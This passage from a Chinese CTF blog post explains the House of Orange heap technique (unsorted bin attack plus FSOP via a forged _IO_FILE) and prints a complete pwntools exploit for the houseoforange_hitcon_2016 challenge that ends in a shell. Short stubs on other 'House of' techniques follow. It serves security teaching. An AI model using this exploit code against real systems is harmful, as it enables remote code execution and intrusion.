<p>通过堆溢出或是其他方式将 unsorted bin 的 bk 指针改为 <code>_IO_list_all - 0x10</code>的地址，size 改为 0x61，并在其中伪造我们的 fake _IO_file_plus 结构体</p>
<p>随后进行一个大于现有 unsorted bin 链表尾结点的请求（假设 unsorted bin 中只有一个 chunk），此时该 chunk <strong>便会被放入 small bin 中</strong></p>
<p>接下来会向 该 chunk 的 bk 成员——  <code>_IO_list_all - 0x10</code> 的 fd 指针——<strong>即 _IO_list_all</strong> 上写入 <code>main_arena + 0x58</code> 的地址，并判断该 “chunk” 是否符合要求——这个时候便会报错，通过 malloc_printerr 最终走到 abort</p>
<p>abort 后会调用 <code>_IO_flush_all_lockp()</code> 函数，先对<code>_IO_list_all</code>—— <code>main_arena + 0x58</code> 进行判断——不符合要求，此时便会从其 <code>_chain</code> 指针取出<strong>下一个_IO_file_plus</strong>结构，而该指针位于 _IO_file_plus结构偏移 <code>0x68</code> 的地方——即从 <strong>main_arena + 0x58 + 0x68</strong> 这个位置取出下一个 _IO_file_plus 结构体，<strong>刚好是 small bin 中 size 为 0x60 的地方</strong>，由此完成我们的 FSOP</p>
<h3 id="例题：houseoforange-hitcon-2016-House-of-Orange"><a href="#例题：houseoforange-hitcon-2016-House-of-Orange" class="headerlink" title="例题：houseoforange_hitcon_2016 - House of Orange"></a>例题：houseoforange_hitcon_2016 - House of Orange</h3><p>想都不用想肯定事保护全开</p>
<p><img src="https://i.loli.net/2021/05/10/aQHisnOz1tXlCMY.png" alt="image.png"></p>
<p>拖入 IDA 进行分析，大概有着分配、打印、编辑堆块的功能，<strong>没有释放的功能</strong></p>
<p>只能分配三次</p>
<p><img src="https://i.loli.net/2021/05/10/6KJBQ7vXUPLcF3C.png" alt="image.png"></p>
<p>漏洞点在于编辑堆块的时候验证不严密，存在堆溢出</p>
<p><img src="https://i.loli.net/2021/05/10/1YseHJxnPOZQc4K.png" alt="image.png"></p>
<p>由于没有 free() 函数，考虑通过堆溢出修改 top chunk 的 size 后再行分配触发 brk 系统调用扩展堆区将原有 top chunk 送入 unsorted bin 后再分配回来，通过 bk 指针泄露 libc 基址</p>
<p>我们都知道，在分配时若是 small bin 和 large bin 都是空的时候，ptmalloc2 会将 unsorted bin 中所有 chunk 放入 对应 bin 中，因此我们可以通过分配 large bin 以由其 fd_nextsize 指针泄露堆基址</p>
<p>随后在 unsorted bin 中伪造 _IO_file_plus 结构体，通过 House of Orange 的手法进行 FSOP 以 get shell</p>
<p>比较坑的一个点大概是本地和远程偏移好像有些小不一样……？后面懒得去算偏移了直接大面积撞就完事了</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27323</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content, price:<span class="built_in">int</span>, color:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size:<span class="built_in">int</span>, content, price:<span class="built_in">int</span>, color:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Price of Orange: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Color of Orange: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>  + p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>), <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    new(<span class="number">0x1000</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    new(<span class="number">0x400</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    dump()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">    fake_file += p64(<span class="number">0x61</span>) <span class="comment"># _IO_read_ptr, chunk size, got it into proper small bin</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(heap_base + <span class="number">0x600</span>) <span class="comment"># fake vtable`</span></span><br><span class="line">    fake_file += <span class="number">20</span> * p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x1000</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + fake_file, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/11/q5paW1fs7Tvl8yg.png" alt="image.png"></p>
<h2 id="House-of-Rabbit-兔子の窝"><a href="#House-of-Rabbit-兔子の窝" class="headerlink" title="House of Rabbit - 兔子の窝"></a>House of Rabbit - 兔子の窝</h2><p>在 malloc 时对于 fastbin 中的 chunk 存在着 size 检查，但是在 malloc_consolidate() 函数过程中并不会对 fastbin chunk 的 size 进行检查，由此构造 overlapping</p>
<h3 id="例题：HITB-GSEC-XCTF-2018-mutepig"><a href="#例题：HITB-GSEC-XCTF-2018-mutepig" class="headerlink" title="例题：HITB-GSEC-XCTF 2018 mutepig"></a>例题：HITB-GSEC-XCTF 2018 mutepig</h3><h2 id="House-of-Roman-罗马の家"><a href="#House-of-Roman-罗马の家" class="headerlink" title="House of Roman - 罗马の家"></a>House of Roman - 罗马の家</h2><p>fastbin attack + unsorted bin attack</p>
<h3 id="例题：-npuctf-2020-bad-guy"><a href="#例题：-npuctf-2020-bad-guy" class="headerlink" title="例题： npuctf_2020_bad_guy"></a>例题： npuctf_2020_bad_guy</h3><h2 id="House-of-Spirit-精神の院"><a href="#House-of-Spirit-精神の院" class="headerlink" title="House of Spirit - 精神の院"></a>House of Spirit - 精神の院</h2><p>在不可控区域伪造 fake chunk 以达到可控</p>
<h3 id="例题：LCTF2016-PWN200"><a href="#例题：LCTF2016-PWN200" class="headerlink" title="例题：LCTF2016_PWN200"></a>例题：LCTF2016_PWN200</h3><h2 id="House-of-Storm-风暴の域"><a href="#House-of-Storm-风暴の域" class="headerlink" title="House of Storm - 风暴の域"></a>House of Storm - 风暴の域</h2><p>large bin attack + unsorted bin attack</p>
<h3 id="例题：0ctf2018-heapstorm2"><a href="#例题：0ctf2018-heapstorm2" class="headerlink" title="例题：0ctf2018_ heapstorm2"></a>例题：0ctf2018_ heapstorm2</h3>
      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/04/24/CVE-0X01-CVE-2021-3156/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2021-05-10 03:56:56
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="分类"></i>
                    
                    <span class="span--category">
                      <a href="/categories/PWN/" title="PWN">
                        <b>#</b> PWN
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="标签"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
                        <b>#</b> 信息安全
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%A0%86/" title="堆">
                        <b>#</b> 堆
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Use-After-Free/" title="Use After Free">
                        <b>#</b> Use After Free
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2libc/" title="ret2libc">
                        <b>#</b> ret2libc
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ROP/" title="ROP">
                        <b>#</b> ROP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" title="堆风水">
                        <b>#</b> 堆风水
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/" title="got表劫持">
                        <b>#</b> got表劫持
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">
                        <b>#</b> 栈迁移
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/IO-FILE-hijack/" title="_IO_FILE hijack">
                        <b>#</b> _IO_FILE hijack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Fastbin-Attack/" title="Fastbin Attack">
                        <b>#</b> Fastbin Attack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/FSOP/" title="FSOP">
                        <b>#</b> FSOP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Heap-Overflow/" title="Heap Overflow">
                        <b>#</b> Heap Overflow
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Botcake/" title="House of Botcake">
                        <b>#</b> House of Botcake
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Einherjar/" title="House of Einherjar">
                        <b>#</b> House of Einherjar
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Force/" title="House of Force">
                        <b>#</b> House of Force
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Husk/" title="House of Husk">
                        <b>#</b> House of Husk
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Kiwi/" title="House of Kiwi">
                        <b>#</b> House of Kiwi
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Lore/" title="House of Lore">
                        <b>#</b> House of Lore
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Orange/" title="House of Orange">
                        <b>#</b> House of Orange
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Rabbit/" title="House of Rabbit">
                        <b>#</b> House of Rabbit
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Roman/" title="House of Roman">
                        <b>#</b> House of Roman
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Spirit/" title="House of Spirit">
                        <b>#</b> House of Spirit
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Storm/" title="House of Storm">
                        <b>#</b> House of Storm
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/off-by-one/" title="off by one">
                        <b>#</b> off by one
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/one-gadget/" title="one_gadget">
                        <b>#</b> one_gadget
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/python/" title="python">
                        <b>#</b> python
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Unlink/" title="Unlink">
                        <b>#</b> Unlink
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Unsorted-bin-Attack/" title="Unsorted bin Attack">
                        <b>#</b> Unsorted bin Attack
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/05/15/CTF-0X04-CISCN2021-PRELIMINARY/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%86%99%E5%9C%A8%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="toc-text">0x00.写在开始之前</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%89%88%E5%BC%95%E8%A8%80"><span class="toc-text">第一版引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">前置知识：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%A0%86%E5%86%85%E5%AD%98%E7%9A%84%E5%88%86%E9%85%8D-amp-%E9%87%8A%E6%94%BE"><span class="toc-text">0x01.堆内存的分配&amp;释放</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E7%9B%B8%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-text">堆相关系统调用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#brk"><span class="toc-text">brk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap"><span class="toc-text">mmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3%EF%BC%9A%E9%87%8D%E7%94%A8"><span class="toc-text">内存分配基本思想：重用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">0x02.堆相关数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-chunk"><span class="toc-text">1.chunk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="toc-text">基本结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90"><span class="toc-text">内存对齐</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E5%BF%97%E4%BD%8D%E5%AE%9A%E4%B9%89%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%AE%8F"><span class="toc-text">标志位定义及相关宏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Echunk%E9%97%B4%E7%9A%84%E5%86%85%E5%AD%98%E5%A4%8D%E7%94%A8%E5%8F%8Arequest2size%E8%AE%A1%E7%AE%97%E7%9B%B8%E5%85%B3%E4%BA%8B%E9%A1%B9"><span class="toc-text">关于chunk间的内存复用及request2size计算相关事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Top-Chunk"><span class="toc-text">Top Chunk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-arena"><span class="toc-text">2.arena</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main-arena"><span class="toc-text">main_arena</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0fast-bin"><span class="toc-text">①fast bin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5"><span class="toc-text">安全检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#I-size"><span class="toc-text">I.size</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#II-double-free"><span class="toc-text">II.double free</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#III-Safe-linking-%E6%9C%BA%E5%88%B6%EF%BC%88only-glibc2-32-and-up%EF%BC%89"><span class="toc-text">III.Safe linking 机制（only glibc2.32 and up）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1tcache%EF%BC%88only-libc2-26-and-up%EF%BC%89"><span class="toc-text">②tcache（only libc2.26 and up）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-text">安全保护机制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#I-tcache-key%EF%BC%88only-libc2-29-and-up%EF%BC%89"><span class="toc-text">I.tcache key（only libc2.29 and up）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#II-Safe-linking-%E6%9C%BA%E5%88%B6%EF%BC%88only-glibc2-32-and-up%EF%BC%89"><span class="toc-text">II.Safe linking 机制（only glibc2.32 and up）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2bins%E6%95%B0%E7%BB%84"><span class="toc-text">③bins数组</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink"><span class="toc-text">unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#I-unlink-under-glibc2-28-involved"><span class="toc-text">I.unlink under glibc2.28(involved)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#II-unlink-over-glibc-2-29-involved"><span class="toc-text">II.unlink over glibc 2.29(involved)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin"><span class="toc-text">unsorted bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small-bin"><span class="toc-text">small bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#large-bin"><span class="toc-text">large bin</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">0x03.内存分配相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81malloc"><span class="toc-text">一、malloc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-hook"><span class="toc-text">__malloc_hook</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81free"><span class="toc-text">二、free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#free-hook"><span class="toc-text">__free_hook</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81realloc"><span class="toc-text">三、realloc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#realloc-hook"><span class="toc-text">__realloc_hook</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81calloc"><span class="toc-text">四、calloc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81malloc-consolidate"><span class="toc-text">五、malloc_consolidate</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E5%B1%82%E5%BE%AA%E7%8E%AF%EF%BC%9A%E9%81%8D%E5%8E%86fastbinsY%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0"><span class="toc-text">外层循环：遍历fastbinsY数组元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%B1%82%E5%BE%AA%E7%8E%AF%EF%BC%9A%E9%81%8D%E5%8E%86fastbin-%E9%93%BE%E8%A1%A8%E3%80%81%E5%90%88%E5%B9%B6%E7%A9%BA%E9%97%B2chunk"><span class="toc-text">内层循环：遍历fastbin 链表、合并空闲chunk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%90%8E%E5%90%91%E5%90%88%E5%B9%B6%EF%BC%9A%E4%BD%BF%E7%94%A8unlink%E5%8F%96%E5%87%BA%E7%9B%B8%E9%82%BB%E4%BD%8E%E5%9C%B0%E5%9D%80chunk%EF%BC%88%E8%8B%A5%E5%B7%B2free%EF%BC%89"><span class="toc-text">①后向合并：使用unlink取出相邻低地址chunk（若已free）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 